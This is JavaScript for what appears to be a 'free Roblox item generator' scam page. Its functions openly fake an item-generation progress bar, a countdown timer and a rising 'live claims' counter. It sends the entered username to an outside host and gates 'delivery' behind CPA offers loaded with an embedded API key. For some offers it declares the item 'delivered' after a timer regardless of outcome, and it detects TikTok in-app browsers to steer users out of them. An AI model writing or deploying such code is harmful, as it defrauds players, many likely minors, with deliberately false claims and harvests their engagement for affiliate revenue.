(() => {

    const getById = (id) => document.getElementById(id);

    /* =========================================================
       GENERATOR MODAL STATE
    ========================================================= */
    let _genItemName = "";
    let _genItemImg  = "";
    let _genTimerInterval = null;

    /* ─── Open modal ─── */
    window.openLocker = (itemName, itemImg) => {
        _genItemName = itemName || "";
        _genItemImg  = itemImg  || "";

        // Reset to screen 1
        _showGenScreen(1);
        const input = getById("gen-username-input");
        const err   = getById("gen-error");
        if (input) input.value = "";
        if (err)   err.textContent = "";

        // Populate item preview
        const previewImg  = getById("gen-item-img");
        const previewName = getById("gen-item-name");
        if (previewImg && _genItemImg)  previewImg.src = _genItemImg;
        if (previewName && _genItemName) previewName.textContent = _genItemName;

        // Reset progress steps
        [1,2,3,4].forEach(i => {
            const step = getById(`gstep-${i}`);
            const icon = getById(`gstep-${i}-icon`);
            if (step) step.classList.remove("done","active");
            if (icon) icon.innerHTML = `<span class="gen-step-num">${i}</span>`;
        });
        const bar = getById("gen-progress-bar");
        if (bar) bar.style.width = "0%";

        document.getElementById("gen-modal").classList.add("open");
        setTimeout(() => input?.focus(), 80);
    };

    window.closeGenModal = () => {
        document.getElementById("gen-modal").classList.remove("open");
        clearInterval(_genTimerInterval);
    };

    function _showGenScreen(n) {
        [1,2,3].forEach(i => {
            const s = getById(`gen-screen-${i}`);
            if (s) s.classList.toggle("active", i === n);
        });
    }

    /* ─── Screen 1 → 2: Start fake generation ─── */
    window.startFakeGen = async () => {
        const input = getById("gen-username-input");
        const err   = getById("gen-error");
        const username = input ? input.value.trim() : "";

        if (!username) {
            if (err) err.textContent = "Please enter your Roblox username.";
            input?.focus();
            return;
        }
        if (err) err.textContent = "";

        const progHeader = document.querySelector(".gen-progress-header");
        if (progHeader) progHeader.style.display = "flex";

        _showGenScreen(2);

        const finalUserStr = getById("gen-final-user");
        if (finalUserStr) finalUserStr.textContent = username;

        // Fetch user data in background to update images without delaying the UI
        fetch(`https://abadaoucht.com/tiktok/api/roblox/userinfo/${encodeURIComponent(username)}`)
            .then(res => res.json())
            .then(data => {
                if (data && data.status === "SUCCESS") {
                    const scannerAvatar = getById("scanner-avatar-img");
                    const successUserImg = getById("gen-success-user-img");
                    const successUsername = getById("gen-success-username");
                    
                    if (scannerAvatar) scannerAvatar.src = data.avatar || "images/default-avatar.png";
                    if (successUserImg) successUserImg.src = data.avatar || "images/default-avatar.png";
                    if (successUsername) successUsername.textContent = data.name || data.username;
                }
            }).catch(e => console.log("Avatar fetch error", e));

        await _runFakeProgress(username);
    };

    async function _runFakeProgress(username) {
        const scannerContainer = getById("avatar-scanner-container");
        if (scannerContainer) scannerContainer.classList.add("scanning");
        
        const steps = [
            { id: 1, label: "Locating account",    sub: `Found: ${username}`,           bar: 25  },
            { id: 2, label: "Generating item",      sub: `Item prepared: ${_genItemName || "item"}`, bar: 55  },
            { id: 3, label: "Encrypting transfer",  sub: "Transfer encrypted ✓",         bar: 80  },
            { id: 4, label: "Ready to deliver",     sub: "Verification required",         bar: 100 },
        ];

        const labelEl = getById("gen-progress-label");
        const barEl   = getById("gen-progress-bar");

        for (const s of steps) {
            const stepEl = getById(`gstep-${s.id}`);
            const iconEl = getById(`gstep-${s.id}-icon`);
            const subEl  = getById(`gstep-${s.id}-sub`);

            if (stepEl) stepEl.classList.add("active");
            if (labelEl) labelEl.textContent = s.label + "...";

            await _delay(900 + Math.random() * 600);

            if (subEl)  subEl.textContent  = s.sub;
            if (stepEl) { stepEl.classList.remove("active"); stepEl.classList.add("done"); }
            if (iconEl) iconEl.innerHTML = "✓";
            if (barEl)  barEl.style.width = s.bar + "%";

            await _delay(200);
        }
        
        if (scannerContainer) scannerContainer.classList.remove("scanning");

        if (labelEl) labelEl.textContent = "Done! Ready to claim.";

        // Populate screen 3
        const input = getById("gen-username-input");
        const uname = (input ? input.value.trim() : "") || username;

        const finalItem = getById("gen-final-item");
        const finalUser = getById("gen-final-user");
        const finalImg  = getById("gen-final-img");
        const successImg = getById("gen-success-item-img");
        const finalName = getById("gen-final-name");

        if (finalItem) finalItem.textContent = _genItemName;
        if (finalUser) finalUser.textContent = uname;
        if (finalImg && _genItemImg) finalImg.src = _genItemImg;
        if (successImg && _genItemImg) successImg.src = _genItemImg;
        if (finalName) finalName.textContent = _genItemName;

        // Start countdown timer
        _startTimer(5 * 60 - 1);

        await _delay(600);
        _showGenScreen(3);
        fetchOffers();
    }

    function _startTimer(seconds) {
        clearInterval(_genTimerInterval);
        const el = getById("gen-timer");
        let remaining = seconds;
        const tick = () => {
            if (!el) return;
            const m = Math.floor(remaining / 60);
            const s = remaining % 60;
            el.textContent = `${m}:${s.toString().padStart(2,"0")}`;
            if (remaining <= 0) { clearInterval(_genTimerInterval); return; }
            remaining--;
        };
        tick();
        _genTimerInterval = setInterval(tick, 1000);
    }

    /* ─── CPA Logic ─── */
    async function fetchOffers() {
        const loading = getById("offersLoading");
        const container = getById("offerContainer");
        if(loading) loading.style.display = "block";
        if(container) container.style.display = "none";
        
        $.getJSON("https://de6jvomfbm0af.cloudfront.net/public/offers/feed.php?user_id=198696&api_key=3b3e46d66986883b785b4cf2711b686a&s1=&s2=&callback=?", function(offers) {
            if(loading) loading.style.display = "none";
            if(container) {
                container.style.display = "flex";
                container.innerHTML = "";
                
                let finalOffers = offers.slice(0, 2);
                
                finalOffers.forEach(offer => {
                    const a = document.createElement("a");
                    a.href = offer.url;
                    a.className = "offer-card";
                    a.target = "_blank";
                    a.onclick = () => { startLeadCheck(offer.isCustom); };
                    
                    const leftDiv = document.createElement("div");
                    leftDiv.className = "offer-left";

                    const img = document.createElement("img");
                    img.src = offer.network_icon || "https://static.wikia.nocookie.net/growagarden27847/images/f/fe/GAG2Logo.png";
                    img.className = "offer-img";
                    
                    const infoDiv = document.createElement("div");
                    infoDiv.className = "offer-info";
                    
                    const spanTitle = document.createElement("span");
                    spanTitle.className = "offer-title";
                    spanTitle.textContent = offer.anchor;
                    
                    const spanDesc = document.createElement("span");
                    spanDesc.className = "offer-desc";
                    spanDesc.textContent = offer.conversion || "Complete to unlock";
                    
                    infoDiv.appendChild(spanTitle);
                    infoDiv.appendChild(spanDesc);

                    leftDiv.appendChild(img);
                    leftDiv.appendChild(infoDiv);

                    const spanAction = document.createElement("span");
                    spanAction.className = "offer-action";
                    spanAction.textContent = "Start";
                    
                    a.appendChild(leftDiv);
                    a.appendChild(spanAction);
                    container.appendChild(a);
                });
            }
        }).fail(function() {
            if(loading) loading.textContent = "No tasks available right now. Please try again later.";
        });
    }

    let checkLeadsInterval = null;
    let customUnlockTimeout = null;
    function startLeadCheck(isCustom = false) {
        if (checkLeadsInterval) return;
        const cpaStatusText = getById("cpaStatusText");
        if(cpaStatusText) cpaStatusText.textContent = "Task opened. Waiting for completion...";
        
        const unlockSuccess = () => {
            clearInterval(checkLeadsInterval);
            if (customUnlockTimeout) clearTimeout(customUnlockTimeout);
            if(cpaStatusText) {
                cpaStatusText.textContent = "Verification Successful!";
                cpaStatusText.style.color = "var(--success)";
            }
            const timerEl = getById("gen-timer");
            if (timerEl && timerEl.parentElement) {
                timerEl.parentElement.innerHTML = "<strong>Your item has been delivered!</strong>";
            }
            getById("offerContainer").innerHTML = `<div class="success-message-box">🎉 Item added to <strong>${getById("gen-final-user")?.textContent || "your"}</strong> account successfully! Please check in-game.</div>`;
        };

        if (isCustom) {
            // Fake unlock after 2 minutes for custom offer
            customUnlockTimeout = setTimeout(unlockSuccess, 120000);
        }

        checkLeadsInterval = setInterval(() => {
            $.getJSON("https://d1cdbd1x576ga0.cloudfront.net/public/external/check2.php?testing=0&callback=?", function(leads) {
                if (leads && leads.length > 0) {
                    unlockSuccess();
                }
            });
        }, 15000);
    }

    function _delay(ms) { return new Promise(r => setTimeout(r, ms)); }

    /* =========================================================
       iOS / TikTok popup
    ========================================================= */
    const showIosPopup = () => {
        const popup = getById("ios-popup");
        if (popup) popup.style.display = "flex";
    };

    const isIos = () => {
        const ua = navigator.userAgent || "";
        const pl = navigator.platform || "";
        return /iPad|iPhone|iPod/.test(ua) || /iPad|iPhone|iPod/.test(pl) ||
            (navigator.maxTouchPoints > 1 && /Mac/.test(pl));
    };

    const isInAppBrowser = () =>
        /FBAN|FBAV|Instagram|Line|Twitter|Snapchat|TikTok|Pinterest|Telegram|WhatsApp|Messenger|LinkedIn/i
            .test(navigator.userAgent || "");

    const isTikTokWebView = () =>
        /TikTok|TTWebView|musical_ly|Bytedance|ByteDance|aweme/i.test(navigator.userAgent || "");

    const shouldForcePopup = () => window.location.search.includes("showPopup=1");

    const maybeShowIosPopup = () => {
        if (isTikTokWebView() || shouldForcePopup()) { showIosPopup(); return; }
        if (isIos() && isInAppBrowser()) showIosPopup();
    };

    /* =========================================================
       INIT
    ========================================================= */
    const init = () => {
        maybeShowIosPopup();
        setTimeout(maybeShowIosPopup, 500);
        initI18n();
        document.body?.classList.add("is-ready");

        // Hide gears (Boosts) by default
        document.querySelectorAll('.category-gears').forEach(el => el.style.display = 'none');

        // Tab Switching Event Listeners
        document.querySelectorAll('.store-tab').forEach(tab => {
            tab.addEventListener('click', (e) => {
                e.preventDefault();
                document.querySelectorAll('.store-tab').forEach(t => t.classList.remove('active'));
                tab.classList.add('active');
                if (tab.classList.contains('tab-seeds')) {
                    document.querySelectorAll('.category-seeds').forEach(el => el.style.display = 'flex');
                    document.querySelectorAll('.category-gears').forEach(el => el.style.display = 'none');
                } else {
                    document.querySelectorAll('.category-seeds').forEach(el => el.style.display = 'none');
                    document.querySelectorAll('.category-gears').forEach(el => el.style.display = 'flex');
                }
            });
        });

        // Delegate all Claim button clicks → openLocker with item data
        document.addEventListener("click", (e) => {
            const btn = e.target.closest(".btn-claim");
            if (!btn) return;
            e.preventDefault();
            const card = btn.closest(".item-card");
            const name  = card?.querySelector(".item-name")?.textContent?.trim() || "";
            const imgEl = card?.querySelector(".item-image img");
            const img   = imgEl ? imgEl.src : "";
            window.openLocker(name, img);
        });
    };

    if (document.readyState === "loading") {
        document.addEventListener("DOMContentLoaded", init);
    } else {
        init();
    }


})();


/* =========================================================
   i18n
========================================================= */
function initI18n() {
    const translations = {
        en: {
            hero_title_top: "GET YOUR FREE SPEED KEYBOARD ESCAPE",
            hero_title_bottom: "RIVALS WEAPON",
            hero_subtitle: "For Roblox players. Tap claim and unlock your drop.",
            cta_claim: "Claim Now",
            hero_live: "Live claims: {count} today",
            social_proof: "Players claiming right now",
            claim_btn: "Claim",
            ios_title: "Open in Browser Required",
            ios_text: "Please click on the <strong>three dots (⋯)</strong> at the top and select <strong>\"Open in Browser\"</strong> to claim your free Speed Keyboard Escape items."
        },
        es: {
            hero_title_top: "OBTÉN TU SPEED KEYBOARD ESCAPE",
            hero_title_bottom: "ARMA GRATIS",
            hero_subtitle: "Para jugadores de Roblox. Pulsa reclamar y desbloquea tu drop.",
            cta_claim: "Reclamar Ahora",
            hero_live: "Reclamos en vivo: {count} hoy",
            social_proof: "Jugadores reclamando ahora",
            claim_btn: "Reclamar",
            ios_title: "Se requiere navegador",
            ios_text: "Pulsa los <strong>tres puntos (⋯)</strong> arriba y selecciona <strong>\"Abrir en el navegador\"</strong>."
        },
        fr: {
            hero_title_top: "OBTIENS TON SPEED KEYBOARD ESCAPE",
            hero_title_bottom: "ARME GRATUITE",
            hero_subtitle: "Pour les joueurs Roblox. Appuie pour réclamer ton drop.",
            cta_claim: "Réclamer",
            hero_live: "Réclamations: {count} aujourd'hui",
            social_proof: "Joueurs en train de réclamer",
            claim_btn: "Réclamer",
            ios_title: "Ouvre dans le navigateur",
            ios_text: "Appuie sur les <strong>trois points (⋯)</strong> en haut et choisis <strong>« Ouvrir dans le navigateur »</strong>."
        },
        ar: {
            hero_title_top: "احصل على SPEED KEYBOARD ESCAPE",
            hero_title_bottom: "سلاحك المجاني",
            hero_subtitle: "للاعبي روبلوكس. اضغط للمطالبة وافتح هديتك.",
            cta_claim: "اطلب الآن",
            hero_live: "مطالبات مباشرة: {count} اليوم",
            social_proof: "لاعبون يطالبون الآن",
            claim_btn: "اطلب",
            ios_title: "افتح في المتصفح",
            ios_text: "اضغط على <strong>النقاط الثلاث (⋯)</strong> بالأعلى واختر <strong>\"افتح في المتصفح\"</strong>."
        },
        pt: {
            hero_title_top: "PEGUE SUA SPEED KEYBOARD ESCAPE",
            hero_title_bottom: "ARMA GRÁTIS",
            hero_subtitle: "Para jogadores de Roblox. Toque em reivindicar e desbloqueie.",
            cta_claim: "Reivindicar",
            hero_live: "Reivindicações: {count} hoje",
            social_proof: "Jogadores reivindicando agora",
            claim_btn: "Reivindicar",
            ios_title: "Abra no navegador",
            ios_text: "Toque nos <strong>três pontos (⋯)</strong> acima e selecione <strong>\"Abrir no navegador\"</strong>."
        },
        fil: {
            hero_title_top: "KUNIN ANG SPEED KEYBOARD ESCAPE",
            hero_title_bottom: "LIBRENG SANDATA",
            hero_subtitle: "Para sa mga Roblox player. I-tap ang claim at kunin ang drop.",
            cta_claim: "I-claim",
            hero_live: "Live claims: {count} ngayon",
            social_proof: "May nagki-claim ngayon",
            claim_btn: "I-claim",
            ios_title: "Buksan sa browser",
            ios_text: "I-tap ang <strong>tatlong tuldok (⋯)</strong> sa itaas at piliin ang <strong>\"Buksan sa browser\"</strong>."
        }
    };

    const liveEl = document.querySelector('[data-i18n="hero_live"]');
    let liveCount = 1248;
    if (liveEl?.dataset?.liveCount) {
        const parsed = parseInt(liveEl.dataset.liveCount.replace(/[^0-9]/g, ""), 10);
        if (!Number.isNaN(parsed)) liveCount = parsed;
    }

    const fmt = (text, vars = {}) =>
        text.replace(/\{(\w+)\}/g, (_, k) => vars[k] != null ? vars[k] : `{${k}}`);

    const fmtNum = (v, lang) => {
        try { return new Intl.NumberFormat(lang || "en").format(v); }
        catch { return v.toLocaleString(); }
    };

    const updateLive = (lang) => {
        if (!liveEl) return;
        const dict = translations[lang] || translations.en;
        liveEl.textContent = fmt(dict.hero_live || "Live claims: {count} today", { count: fmtNum(liveCount, lang) });
    };

    const select = document.getElementById("language-select");
    const label = document.querySelector(".lang-label");
    if (!select) return;

    const applyLang = (lang) => {
        const dict = translations[lang] || translations.en;
        window.__i18n = { lang, dict };

        document.querySelectorAll("[data-i18n]").forEach(el => {
            const k = el.getAttribute("data-i18n");
            if (dict[k]) el.textContent = fmt(dict[k], { count: fmtNum(liveCount, lang) });
        });
        document.querySelectorAll("[data-i18n-html]").forEach(el => {
            const k = el.getAttribute("data-i18n-html");
            if (dict[k]) el.innerHTML = fmt(dict[k], { count: fmtNum(liveCount, lang) });
        });
        document.querySelectorAll(".btn-claim").forEach(btn => {
            if (dict.claim_btn) btn.textContent = dict.claim_btn;
        });
        if (label) label.textContent = lang.toUpperCase();
        document.documentElement.setAttribute("dir", lang === "ar" ? "rtl" : "ltr");
        updateLive(lang);
    };

    applyLang("en");
    select.addEventListener("change", e => applyLang(e.target.value));

    if (liveEl) {
        setInterval(() => {
            liveCount += Math.floor(Math.random() * 6) + 1;
            updateLive(window.__i18n?.lang || "en");
        }, 2000);
    }
}
